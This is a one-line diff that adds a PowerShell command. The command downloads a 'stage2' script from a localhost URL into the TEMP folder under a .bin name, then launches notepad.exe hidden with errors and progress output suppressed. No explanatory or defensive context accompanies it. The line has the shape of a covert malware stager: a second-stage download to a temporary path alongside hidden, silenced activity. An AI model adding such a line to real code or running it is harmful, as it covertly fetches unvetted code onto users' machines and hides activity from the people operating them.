@@ -1,0 +1,1 @@
+$RemoteUrl = "https://localhost:8080/stage2.ps1"; $WorkingPath = "$env:TEMP\stage2.bin"; (New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $WorkingPath); Start-Process -FilePath 'notepad.exe' -WindowStyle Hidden -ErrorAction SilentlyContinue; $ProgressPreference = "SilentlyContinue"
